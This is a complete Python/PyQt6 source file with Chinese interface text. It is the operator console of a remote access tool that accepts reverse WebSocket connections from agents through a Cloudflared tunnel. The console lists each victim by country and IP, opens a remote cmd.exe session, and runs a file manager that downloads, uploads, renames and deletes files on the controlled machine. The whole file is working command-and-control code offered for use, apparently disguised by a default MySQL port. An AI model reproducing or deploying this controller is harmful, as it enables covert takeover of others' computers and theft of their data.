import sys
import os
import socket
import threading
import hashlib
import base64
import time
import struct
from datetime import datetime
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
                             QLabel, QLineEdit, QPushButton, QListView, QTextEdit, QDialog,
                             QMenu, QAbstractItemView, QTableWidget, QTableWidgetItem,
                             QHeaderView, QMessageBox, QFileDialog, QInputDialog)
from PyQt6.QtCore import Qt, QAbstractListModel, QVariant, QModelIndex, pyqtSignal, QObject, pyqtSlot, QTimer
from PyQt6.QtGui import QColor, QPalette

WS_OP_CONTINUE = 0x00
WS_OP_TEXT = 0x01
WS_OP_BINARY = 0x02
WS_OP_CLOSE = 0x08
WS_OP_PING = 0x09
WS_OP_PONG = 0x0A

MAX_CHUNK = 4096  # 和agent缓冲区匹配，单分片最大字节

def ws_compute_accept(key: bytes) -> bytes:
    magic = b"258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
    sha1 = hashlib.sha1(key + magic).digest()
    return base64.b64encode(sha1)

def ws_unmask_payload(payload: bytes, mask_key: bytes) -> bytes:
    return bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))

def ws_build_server_frame(fin: bool, opcode: int, payload: bytes) -> bytes:
    header = bytearray()
    b1 = (0x80 if fin else 0) | (opcode & 0x0f)
    header.append(b1)
    length = len(payload)
    b2 = 0
    if length <= 125:
        b2 |= length
        header.append(b2)
    elif length <= 0xFFFF:
        b2 |= 126
        header.append(b2)
        header.extend(struct.pack(">H", length))
    else:
        b2 |= 127
        header.append(b2)
        header.extend(struct.pack(">Q", length))
    return bytes(header) + payload

def ws_parse_frame(data: bytearray):
    if len(data) < 2:
        return (None, None, None, 0)
    p = 0
    b1 = data[p]
    p += 1
    b2 = data[p]
    p += 1
    fin = bool(b1 & 0x80)
    opcode = b1 & 0x0F
    has_mask = bool(b2 & 0x80)
    payload_len = b2 & 0x7F
    if payload_len == 126:
        if len(data) < p + 2:
            return (None, None, None, 0)
        payload_len = struct.unpack(">H", data[p:p+2])[0]
        p += 2
    elif payload_len == 127:
        if len(data) < p + 8:
            return (None, None, None, 0)
        payload_len = struct.unpack(">Q", data[p:p+8])[0]
        p += 8
    mask_key = b""
    if has_mask:
        if len(data) < p + 4:
            return (None, None, None, 0)
        mask_key = data[p:p+4]
        p += 4
    total_need = p + payload_len
    if len(data) < total_need:
        return (None, None, None, 0)
    raw_payload = data[p:p+payload_len]
    if has_mask:
        payload = ws_unmask_payload(raw_payload, mask_key)
    else:
        payload = raw_payload
    consumed = total_need
    return (fin, opcode, payload, consumed)

def ws_handle_http_upgrade(sock: socket.socket) -> tuple[bool, str, str, str]:
    buf = bytearray()
    start = time.time()
    try:
        while True:
            if time.time() - start > 8:
                return False, "", "", ""
            chunk = sock.recv(1024)
            if not chunk:
                time.sleep(0.01)
                continue
            buf.extend(chunk)
            if b"\r\n\r\n" in buf:
                break
    except Exception:
        return False, "", "", ""
    first_line = buf.split(b"\r\n")[0]
    parts = first_line.split(b" ")
    if len(parts) < 3:
        return False, "", "", ""
    method, path, proto = parts
    if path not in (b"/", b"/ws"):
        return False, "", "", ""
    headers = {}
    for line in buf.split(b"\r\n")[1:]:
        if not line:
            continue
        if b":" in line:
            k_raw, v_raw = line.split(b":", 1)
            k = bytes(k_raw).strip().lower()
            v = bytes(v_raw).strip()
            headers[k] = v
    real_ip = headers.get(b"cf-connecting-ip", b"").decode("utf-8").strip()
    country = headers.get(b"cf-ipcountry", b"").decode("utf-8").strip()
    if not country:
        country = "XX"
    display_name = f"[{country}] {real_ip}" if real_ip else f"[{country}] 未知IP"
    conn_val = headers.get(b"connection", b"")
    upgrade_val = headers.get(b"upgrade", b"")
    ws_key = headers.get(b"sec-websocket-key")
    ws_version = headers.get(b"sec-websocket-version")
    if conn_val != b"Upgrade":
        return False, real_ip, country, display_name
    if upgrade_val != b"websocket":
        return False, real_ip, country, display_name
    if not ws_key:
        return False, real_ip, country, display_name
    if ws_version != b"13":
        return False, real_ip, country, display_name
    accept_val = ws_compute_accept(ws_key)
    resp = (
        b"HTTP/1.1 101 Switching Protocols\r\n"
        b"Upgrade: websocket\r\n"
        b"Connection: Upgrade\r\n"
        b"Sec-WebSocket-Accept: " + accept_val + b"\r\n"
        b"\r\n"
    )
    try:
        sock.sendall(resp)
    except Exception:
        return False, real_ip, country, display_name
    return True, real_ip, country, display_name


class ClientSignals(QObject):
    on_outp = pyqtSignal(object, str)
    on_vfs_reply = pyqtSignal(object, bytes)
    on_disconnect = pyqtSignal(object)


class ClientSession:
    def __init__(self, conn: socket.socket, ip: str, country: str, display_name: str):
        self.conn = conn
        self.ip = ip
        self.country = country
        self.display_name = display_name
        self.last_pong = datetime.now()
        self.connected = True
        self._recv_buf = bytearray()
        self.signals = ClientSignals()
        self._send_lock = threading.Lock()
        self._frag_buf = bytearray()
        self._frag_opcode = 0

    def send_packet(self, body: bytes) -> bool:
        if not self.connected:
            print(f"[DEBUG] send_packet fail: session {self.display_name} disconnected")
            return False
        try:
            full_body = struct.pack(">I", len(body)) + body
            ws_frame = ws_build_server_frame(True, WS_OP_BINARY, full_body)
            with self._send_lock:
                self.conn.sendall(ws_frame)
            print(f"[DEBUG] send_packet -> {self.display_name} cmd={body[:4].decode('ascii','replace')} len={len(body)}")
            return True
        except (OSError, BrokenPipeError):
            print(f"[DEBUG] send_packet exception, close session {self.display_name}")
            self.close()
            return False

    def reset_fragment(self):
        self._frag_buf.clear()
        self._frag_opcode = 0

    def close(self):
        self.connected = False
        try:
            frame_close = ws_build_server_frame(True, WS_OP_CLOSE, b"")
            self.conn.sendall(frame_close)
        except Exception:
            pass
        try:
            self.conn.shutdown(socket.SHUT_RDWR)
        except Exception:
            pass
        try:
            self.conn.close()
        except Exception:
            pass


class RemoteCmdDialog(QDialog):
    def __init__(self, client_session: ClientSession, parent=None):
        super().__init__(parent)
        self.main_window = parent
        self.setWindowTitle(f"远程CMD - {client_session.display_name}")
        self.resize(680, 450)
        self.client = client_session
        self.is_alive = True
        lay = QVBoxLayout(self)
        info_bar = QHBoxLayout()
        info_bar.addWidget(QLabel(f"🌍 国家: {client_session.country}"))
        info_bar.addWidget(QLabel(f"📡 IP: {client_session.ip}"))
        info_bar.addStretch()
        lay.addLayout(info_bar)
        self.out_box = QTextEdit()
        self.out_box.setReadOnly(True)
        lay.addWidget(self.out_box)
        input_lay = QHBoxLayout()
        self.cmd_input = QLineEdit()
        self.cmd_input.setPlaceholderText("输入命令回车执行")
        self.cmd_input.returnPressed.connect(self.on_enter_command)
        input_lay.addWidget(self.cmd_input)
        lay.addLayout(input_lay)
        self.out_box.append(f"==== 连接 {client_session.display_name} 远程CMD ====\n[*] 已发送SPAW启动被控端cmd.exe")
        self.client.send_packet(b"SPAW")
        if parent and hasattr(parent, 'is_dark_mode'):
            self.apply_theme(parent.is_dark_mode)

    def apply_theme(self, dark: bool):
        if dark:
            self.setStyleSheet("""
                QDialog { background-color: #1e1e1e; }
                QLabel { color: #d4d4d4; }
                QTextEdit { background-color: #2d2d2d; color: #d4d4d4; border: 1px solid #3d3d3d; }
                QLineEdit { background-color: #2d2d2d; color: #d4d4d4; border: 1px solid #3d3d3d; }
            """)
        else:
            self.setStyleSheet("")

    @pyqtSlot(str)
    def append_text(self, text: str):
        self.out_box.append(text)

    def on_enter_command(self):
        cmd = self.cmd_input.text().strip()
        self.cmd_input.clear()
        if not self.is_alive or not self.client.connected:
            self.out_box.append("\n[!] 连接断开")
            return
        payload = b"EXEK" + cmd.encode("gbk", errors="replace")
        ok = self.client.send_packet(payload)
        self.out_box.append(f"> {cmd}")
        if not ok:
            self.out_box.append("[发送失败]")

    def closeEvent(self, event):
        self.is_alive = False
        if self.client.connected:
            self.client.send_packet(b"KILL")
        if self.main_window and self.client in self.main_window.open_cmd_dialogs:
            del self.main_window.open_cmd_dialogs[self.client]
        super().closeEvent(event)


class RemoteFileDialog(QDialog):
    def __init__(self, client_session: ClientSession, parent=None):
        super().__init__(parent)
        self.main_window = parent
        self.client = client_session
        self.setWindowTitle(f"远程文件管理器 - {client_session.display_name}")
        self.resize(860, 540)
        self.current_path = b"C:\\"
        self.is_alive = True

        # 下载状态
        self.download_active = False
        self.dst_download_path = ""
        self.download_remote_fullpath = b""
        self.download_offset = 0

        lay = QVBoxLayout(self)
        addr_layout = QHBoxLayout()
        self.btn_back = QPushButton("←上级")
        self.btn_back.clicked.connect(self.go_parent)
        addr_layout.addWidget(self.btn_back)
        self.address_edit = QLineEdit()
        self.address_edit.returnPressed.connect(self.on_address_enter)
        addr_layout.addWidget(self.address_edit)
        self.btn_refresh = QPushButton("刷新")
        self.btn_refresh.clicked.connect(self.refresh_list)
        addr_layout.addWidget(self.btn_refresh)
        self.btn_mkdir = QPushButton("新建文件夹")
        self.btn_mkdir.clicked.connect(self.new_folder)
        addr_layout.addWidget(self.btn_mkdir)
        self.btn_del = QPushButton("删除选中")
        self.btn_del.clicked.connect(self.delete_selected)
        addr_layout.addWidget(self.btn_del)
        self.btn_upload = QPushButton("上传文件")
        self.btn_upload.clicked.connect(self.do_upload_file)
        addr_layout.addWidget(self.btn_upload)
        lay.addLayout(addr_layout)

        self.table = QTableWidget()
        self.table.setColumnCount(3)
        self.table.setHorizontalHeaderLabels(["名称", "类型", "大小"])
        self.table.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        self.table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self.table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        self.table.doubleClicked.connect(self.on_double_click_item)
        self.table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.table.customContextMenuRequested.connect(self.on_table_right_menu)
        lay.addWidget(self.table)

        self.address_edit.setText(self.current_path.decode("utf-8"))
        self.refresh_list()

        if parent and hasattr(parent, 'is_dark_mode'):
            self.apply_theme(parent.is_dark_mode)

    def apply_theme(self, dark: bool):
        if dark:
            self.setStyleSheet("""
                QDialog { background-color: #1e1e1e; }
                QLabel { color: #d4d4d4; }
                QTableWidget { background-color: #2d2d2d; color: #d4d4d4; border:1px solid #3d3d3d; gridline-color:#444; }
                QLineEdit { background-color: #2d2d2d; color: #d4d4d4; border:1px solid #3d3d3d; }
                QPushButton { background-color:#3d3d3d; color:#d4d4d4; border:1px solid #4d4d4d; padding:4px; }
            """)
        else:
            self.setStyleSheet("")

    def send_list_req(self, path: bytes):
        self.client.send_packet(b"LIST" + path)

    def refresh_list(self):
        self.table.setRowCount(0)
        self.address_edit.setText(self.current_path.decode("utf-8"))
        self.send_list_req(self.current_path)

    def go_parent(self):
        p = self.current_path.decode("utf-8")
        stripped = p.rstrip("\\/")
        idx = stripped.rfind("\\")
        if idx <= 0:
            self.current_path = b"C:\\"
        else:
            newp = stripped[:idx] + "\\"
            self.current_path = newp.encode("utf-8")
        self.refresh_list()

    def on_address_enter(self):
        text = self.address_edit.text().strip()
        if not text.endswith("\\"):
            text += "\\"
        self.current_path = text.encode("utf-8")
        self.refresh_list()

    @pyqtSlot(object, bytes)
    def on_vfs_response(self, sess: ClientSession, payload: bytes):
        if sess is not self.client or not self.is_alive:
            return
        cmd = payload[:4]
        body = payload[4:]
        print(f"[VFS RECV] cmd={cmd.decode('ascii','replace')} body_len={len(body)}")
        if cmd == b"LIST":
            self.parse_list_result(body)
        elif cmd == b"READ":
            self.handle_read_chunk(body)
        elif cmd == b"WRIT":
            QMessageBox.information(self, "上传结果", body.decode("utf‑8","replace"))
            self.refresh_list()
        elif cmd == b"MKDIR":
            QMessageBox.information(self, "新建文件夹", body.decode("utf‑8","replace"))
            self.refresh_list()
        elif cmd == b"DEL_":
            QMessageBox.information(self, "删除结果", body.decode("utf‑8","replace"))
            self.refresh_list()
        elif cmd == b"MOVE":
            QMessageBox.information(self, "重命名/移动结果", body.decode("utf‑8","replace"))
            self.refresh_list()

    def parse_list_result(self, body: bytes):
        text = body.decode("utf-8", errors="replace")
        if text.startswith("ERR:"):
            QMessageBox.warning(self, "错误", f"读取目录失败：{text}")
            return
        lines = text.splitlines()
        self.table.setRowCount(0)
        for line in lines:
            if not line.strip():
                continue
            parts = line.split("|")
            if len(parts) !=3:
                continue
            is_dir_str, size_str, fname = parts
            row = self.table.rowCount()
            self.table.insertRow(row)
            item_name = QTableWidgetItem(fname)
            item_type = QTableWidgetItem("文件夹" if is_dir_str=="1" else "文件")
            item_size = QTableWidgetItem(size_str)
            self.table.setItem(row,0,item_name)
            self.table.setItem(row,1,item_type)
            self.table.setItem(row,2,item_size)

    def on_double_click_item(self, index: QModelIndex):
        row = index.row()
        name_item = self.table.item(row,0)
        type_item = self.table.item(row,1)
        fname = name_item.text()
        ftype = type_item.text()
        if ftype == "文件夹":
            current = self.current_path.decode("utf-8")
            new_path = (current + fname + "\\").encode("utf-8")
            self.current_path = new_path
            self.refresh_list()

    def on_table_right_menu(self, pos):
        idx = self.table.indexAt(pos)
        if not idx.isValid():
            return
        row = idx.row()
        name_item = self.table.item(row,0)
        type_item = self.table.item(row,1)
        filename = name_item.text()
        ftype = type_item.text()
        full_remote = (self.current_path.decode("utf‑8") + filename).encode("utf‑8")

        menu = QMenu()
        act_download = menu.addAction("下载到本地")
        act_rename = menu.addAction("重命名")
        ret = menu.exec(self.table.viewport().mapToGlobal(pos))
        if ret == act_download:
            if ftype == "文件夹":
                QMessageBox.warning(self,"提示","暂不支持文件夹下载，仅支持单个文件")
                return
            self.start_download(full_remote, filename)
        elif ret == act_rename:
            self.do_rename(full_remote, filename)

    def new_folder(self):
        name, ok = QInputDialog.getText(self, "新建文件夹", "文件夹名称:")
        if not ok or not name.strip():
            return
        full = (self.current_path.decode("utf‑8") + name.strip()).encode("utf‑8")
        self.client.send_packet(b"MKDIR"+full)

    def delete_selected(self):
        rows = set(idx.row() for idx in self.table.selectedIndexes())
        if not rows:
            return
        reply = QMessageBox.question(self,"确认删除","确定删除选中项？不可恢复！")
        if reply != QMessageBox.StandardButton.Yes:
            return
        for r in rows:
            fname = self.table.item(r,0).text()
            fullpath = (self.current_path.decode("utf‑8") + fname).encode("utf‑8")
            self.client.send_packet(b"DEL_"+fullpath)

    # ========= 重命名 MOVE =========
    def do_rename(self, old_full:bytes, old_name:str):
        new_name, ok = QInputDialog.getText(self,"重命名","输入新名称:", text=old_name)
        if not ok or not new_name.strip():
            return
        base_dir = self.current_path.decode("utf‑8")
        new_full = (base_dir + new_name.strip()).encode("utf‑8")
        payload = old_full + b"\x00" + new_full
        self.client.send_packet(b"MOVE" + payload)

    # ========= 下载 READ 分片 =========
    def start_download(self, remote_full:bytes, filename:str):
        save_path, _ = QFileDialog.getSaveFileName(self, "保存文件到本地", filename)
        if not save_path:
            return
        self.dst_download_path = save_path
        self.download_remote_fullpath = remote_full
        self.download_offset = 0
        self.download_active = True
        print(f"[DOWNLOAD] start remote={remote_full.decode('utf‑8','replace')} local={save_path}")
        self.request_next_download_chunk()

    def request_next_download_chunk(self):
        if not self.download_active:
            return
        # payload: path\0 + offset(uint64) + read_len(uint32)
        path = self.download_remote_fullpath
        payload = path + b"\x00" + struct.pack("<Q", self.download_offset) + struct.pack("<I", MAX_CHUNK)
        self.client.send_packet(b"READ" + payload)

    def handle_read_chunk(self, body:bytes):
        if not self.download_active:
            return
        offset = struct.unpack_from("<Q", body, 0)[0]
        chunk_data = body[8:]
        if offset != self.download_offset:
            print(f"[DOWNLOAD] offset mismatch, abort")
            self.download_active = False
            return
        if len(chunk_data) == 0:
            # EOF
            self.download_active = False
            QMessageBox.information(self,"下载完成",f"文件已保存：{self.dst_download_path}")
            return
        # append to file
        try:
            with open(self.dst_download_path,"ab") as f:
                f.write(chunk_data)
        except Exception as e:
            print(f"[DOWNLOAD] write file err {e}")
            self.download_active = False
            QMessageBox.critical(self,"下载错误",f"写入本地失败：{str(e)}")
            return
        self.download_offset += len(chunk_data)
        QTimer.singleShot(50, self.request_next_download_chunk)

    # ========= 上传 WRIT 分片 =========
    def do_upload_file(self):
        local_path, _ = QFileDialog.getOpenFileName(self, "选择要上传的本地文件")
        if not local_path:
            return
        basename = os.path.basename(local_path)
        remote_full = (self.current_path.decode("utf‑8") + basename).encode("utf‑8")
        print(f"[UPLOAD] local={local_path} remote={remote_full.decode('utf‑8','replace')}")
        threading.Thread(target=self._upload_worker, args=(local_path, remote_full), daemon=True).start()

    def _upload_worker(self, local_path:str, remote_full:bytes):
        offset = 0
        try:
            with open(local_path,"rb") as f:
                while True:
                    chunk = f.read(MAX_CHUNK)
                    if not chunk:
                        break
                    # payload: path\0 + offset(uint64) + data
                    payload = remote_full + b"\x00" + struct.pack("<Q", offset) + chunk
                    self.client.send_packet(b"WRIT" + payload)
                    offset += len(chunk)
                    time.sleep(0.02)
        except Exception as e:
            print(f"[UPLOAD] err {e}")
        QTimer.singleShot(200, self.refresh_list)

    def closeEvent(self, event):
        self.is_alive = False
        self.download_active = False
        if self.main_window and self.client in self.main_window.open_file_dialogs:
            del self.main_window.open_file_dialogs[self.client]
        super().closeEvent(event)


class ClientListModel(QAbstractListModel):
    def __init__(self):
        super().__init__()
        self.items: list[ClientSession] = []

    def rowCount(self, parent=QModelIndex()):
        return len(self.items)

    def data(self, index: QModelIndex, role=Qt.ItemDataRole.DisplayRole):
        if not index.isValid() or role != Qt.ItemDataRole.DisplayRole:
            return QVariant()
        s = self.items[index.row()]
        return QVariant(f"{s.display_name} | last_pong:{s.last_pong.strftime('%H:%M:%S')}")

    def add(self, sess: ClientSession):
        self.beginInsertRows(QModelIndex(), len(self.items), len(self.items))
        self.items.append(sess)
        self.endInsertRows()

    def remove_by_obj(self, sess: ClientSession):
        idx = self.items.index(sess)
        self.beginRemoveRows(QModelIndex(), idx, idx)
        self.items.pop(idx)
        self.endRemoveRows()


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.base_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
        self.is_dark_mode = False
        self.setWindowTitle("WebSocket 反向控制主控端 (Cloudflared Tunnel 模式)")
        self.resize(720, 520)
        self.server_sock: socket.socket | None = None
        self.server_running = False
        self.client_model = ClientListModel()
        self.open_cmd_dialogs: dict[ClientSession, RemoteCmdDialog] = {}
        self.open_file_dialogs: dict[ClientSession, RemoteFileDialog] = {}

        w = QWidget()
        self.setCentralWidget(w)
        lay = QVBoxLayout(w)
        top_lay = QHBoxLayout()
        top_lay.addWidget(QLabel("监听端口:"))
        self.port_edit = QLineEdit("3306")
        top_lay.addWidget(self.port_edit)
        self.btn_start = QPushButton("启动监听")
        self.btn_start.clicked.connect(self.start_server)
        top_lay.addWidget(self.btn_start)
        self.btn_stop = QPushButton("停止监听")
        self.btn_stop.clicked.connect(self.stop_server)
        self.btn_stop.setEnabled(False)
        top_lay.addWidget(self.btn_stop)
        top_lay.addStretch()
        self.btn_theme = QPushButton("🌙 夜间模式")
        self.btn_theme.clicked.connect(self.toggle_theme)
        top_lay.addWidget(self.btn_theme)
        lay.addLayout(top_lay)

        self.view = QListView()
        self.view.setModel(self.client_model)
        self.view.setSelectionMode(QAbstractItemView.SelectionMode.SingleSelection)
        self.view.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.view.customContextMenuRequested.connect(self.on_context_menu)
        lay.addWidget(self.view)
        self.log_box = QTextEdit()
        self.log_box.setReadOnly(True)
        lay.addWidget(self.log_box)

        self.ping_timer = QTimer(self)
        self.ping_timer.setInterval(10000)
        self.ping_timer.timeout.connect(self.broadcast_ping)
        self.apply_theme(False)
        print("==== 主控端调试控制台输出窗口 ====")

    def apply_theme(self, dark: bool):
        self.is_dark_mode = dark
        if dark:
            self.setStyleSheet("""
                QMainWindow { background-color: #1e1e1e; }
                QWidget { background-color: #1e1e1e; }
                QLabel { color: #d4d4d4; }
                QLineEdit {
                    background-color: #2d2d2d;
                    color: #d4d4d4;
                    border: 1px solid #3d3d3d;
                    padding: 4px;
                }
                QPushButton {
                    background-color: #3d3d3d;
                    color: #d4d4d4;
                    border: 1px solid #4d4d4d;
                    padding: 5px 15px;
                }
                QPushButton:hover { background-color: #4d4d4d; }
                QPushButton:disabled { color: #666; background-color: #2d2d2d; }
                QListView {
                    background-color: #2d2d2d;
                    color: #d4d4d4;
                    border: 1px solid #3d3d3d;
                }
                QListView::item:selected { background-color: #3d7a9e; }
                QTextEdit {
                    background-color: #2d2d2d;
                    color: #d4d4d4;
                    border: 1px solid #3d3d3d;
                }
                QMenu { background-color: #2d2d2d; color: #d4d4d4; border: 1px solid #3d3d3d; }
                QMenu::item:selected { background-color: #3d7a9e; }
            """)
            self.btn_theme.setText("☀️ 日间模式")
        else:
            self.setStyleSheet("")
            self.btn_theme.setText("🌙 夜间模式")
        for dlg in self.open_cmd_dialogs.values():
            dlg.apply_theme(dark)
        for dlg in self.open_file_dialogs.values():
            dlg.apply_theme(dark)

    def toggle_theme(self):
        self.apply_theme(not self.is_dark_mode)

    def log(self, msg):
        now = datetime.now().strftime('%H:%M:%S')
        line = f"[{now}] {msg}"
        self.log_box.append(line)
        print(line)

    @pyqtSlot()
    def broadcast_ping(self):
        for sess in list(self.client_model.items):
            if sess.connected:
                sess.send_packet(b"PING")

    def accept_loop(self):
        while self.server_running:
            try:
                raw_conn, addr = self.server_sock.accept()
                self.log(f"收到TCP连接 {addr}")
                ok_handshake, ip, country, display_name = ws_handle_http_upgrade(raw_conn)
                if not ok_handshake:
                    self.log(f"WebSocket握手失败 {addr}")
                    raw_conn.close()
                    continue
                if not ip:
                    ip = addr[0]
                if not country:
                    country = "XX"
                if not display_name:
                    display_name = f"[{country}] {ip}"
                sess = ClientSession(raw_conn, ip, country, display_name)
                sess.signals.on_outp.connect(self.handle_session_outp)
                sess.signals.on_vfs_reply.connect(self.handle_vfs_reply)
                sess.signals.on_disconnect.connect(self.handle_session_disconnect)
                self.client_model.add(sess)
                self.log(f"[新接入] {display_name}")
                t = threading.Thread(target=self.client_recv_loop, args=(sess,), daemon=True)
                t.start()
            except OSError:
                break

    @pyqtSlot(object, str)
    def handle_session_outp(self, sess: ClientSession, text: str):
        if sess in self.open_cmd_dialogs:
            dlg = self.open_cmd_dialogs[sess]
            dlg.append_text(text)

    @pyqtSlot(object, bytes)
    def handle_vfs_reply(self, sess: ClientSession, payload: bytes):
        if sess in self.open_file_dialogs:
            dlg = self.open_file_dialogs[sess]
            dlg.on_vfs_response(sess, payload)

    @pyqtSlot(object)
    def handle_session_disconnect(self, sess: ClientSession):
        if sess in self.open_cmd_dialogs:
            dlg = self.open_cmd_dialogs.pop(sess)
            dlg.append_text("\n[!] WebSocket连接已经断开")
        if sess in self.open_file_dialogs:
            dlg = self.open_file_dialogs.pop(sess)
            dlg.is_alive = False
        self.client_model.remove_by_obj(sess)
        self.log(f"[断开] {sess.display_name}")

    def client_recv_loop(self, sess: ClientSession):
        buf = sess._recv_buf
        while sess.connected:
            try:
                chunk = sess.conn.recv(4096)
                if not chunk:
                    break
                buf.extend(chunk)
                while True:
                    ret = ws_parse_frame(buf)
                    fin, opcode, payload, consumed = ret
                    if consumed <= 0:
                        break
                    del buf[:consumed]
                    if opcode == WS_OP_PING:
                        pong_frame = ws_build_server_frame(True, WS_OP_PONG, payload)
                        with sess._send_lock:
                            sess.conn.sendall(pong_frame)
                        continue
                    elif opcode == WS_OP_PONG:
                        continue
                    elif opcode == WS_OP_CLOSE:
                        break
                    elif opcode == WS_OP_TEXT:
                        text_msg = payload.decode("utf-8", errors="replace")
                        self.log(f"[TEXT] {sess.display_name}: {text_msg}")
                        continue
                    elif opcode in (WS_OP_BINARY, WS_OP_CONTINUE):
                        if opcode == WS_OP_BINARY:
                            sess.reset_fragment()
                            sess._frag_opcode = opcode
                        sess._frag_buf.extend(payload)
                        if fin:
                            full_body = bytes(sess._frag_buf)
                            sess.reset_fragment()
                            if len(full_body) >= 4:
                                body_len = struct.unpack(">I", full_body[0:4])[0]
                                if len(full_body) >= 4 + body_len:
                                    body = full_body[4:4+body_len]
                                    if len(body) >= 4:
                                        cmd_code = body[0:4]
                                        print(f"[RECV PKT] {sess.display_name} cmd={cmd_code.decode('ascii','replace')} body_len={len(body)}")
                                        if cmd_code == b"PONG":
                                            sess.last_pong = datetime.now()
                                            self.client_model.dataChanged.emit(QModelIndex(), QModelIndex())
                                        elif cmd_code == b"OUTP":
                                            output_bytes = body[4:]
                                            out_text = output_bytes.decode("gbk", errors="replace")
                                            sess.signals.on_outp.emit(sess, out_text)
                                        else:
                                            sess.signals.on_vfs_reply.emit(sess, body)
            except (OSError, ConnectionResetError):
                break
        sess.close()
        sess.signals.on_disconnect.emit(sess)

    def start_server(self):
        port = int(self.port_edit.text())
        self.log(f"启动 Cloudflared Tunnel 模式，监听 127.0.0.1:{port}")
        self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_sock.bind(("127.0.0.1", port))
        self.server_sock.listen(8)
        self.server_running = True
        threading.Thread(target=self.accept_loop, daemon=True).start()
        self.ping_timer.start()
        self.btn_start.setEnabled(False)
        self.btn_stop.setEnabled(True)

    def stop_server(self):
        self.ping_timer.stop()
        self.server_running = False
        if self.server_sock:
            try:
                self.server_sock.close()
            except Exception:
                pass
        for s in self.client_model.items:
            s.close()
        self.open_cmd_dialogs.clear()
        self.open_file_dialogs.clear()
        self.btn_start.setEnabled(True)
        self.btn_stop.setEnabled(False)
        self.log("服务器已停止")

    def on_context_menu(self, pos):
        idx = self.view.indexAt(pos)
        if not idx.isValid():
            return
        sess: ClientSession = self.client_model.items[idx.row()]
        menu = QMenu()
        act_open_cmd = menu.addAction("打开远程CMD会话")
        act_open_file = menu.addAction("打开远程磁盘文件管理器")
        ret = menu.exec(self.view.viewport().mapToGlobal(pos))
        if ret == act_open_cmd:
            if sess in self.open_cmd_dialogs:
                dlg = self.open_cmd_dialogs[sess]
                if dlg.isVisible():
                    dlg.raise_()
                    dlg.activateWindow()
                    return
                else:
                    del self.open_cmd_dialogs[sess]
            dlg = RemoteCmdDialog(sess, parent=self)
            dlg.apply_theme(self.is_dark_mode)
            self.open_cmd_dialogs[sess] = dlg
            dlg.show()
        elif ret == act_open_file:
            if sess in self.open_file_dialogs:
                dlg = self.open_file_dialogs[sess]
                if dlg.isVisible():
                    dlg.raise_()
                    dlg.activateWindow()
                    return
                else:
                    del self.open_file_dialogs[sess]
            dlg = RemoteFileDialog(sess, parent=self)
            dlg.apply_theme(self.is_dark_mode)
            self.open_file_dialogs[sess] = dlg
            dlg.show()

    def closeEvent(self, event):
        self.stop_server()
        event.accept()


if __name__ == "__main__":
    # pyinstaller打包时，要保留控制台黑框，不要加 --windowed
    app = QApplication(sys.argv)
    win = MainWindow()
    win.show()
    sys.exit(app.exec())
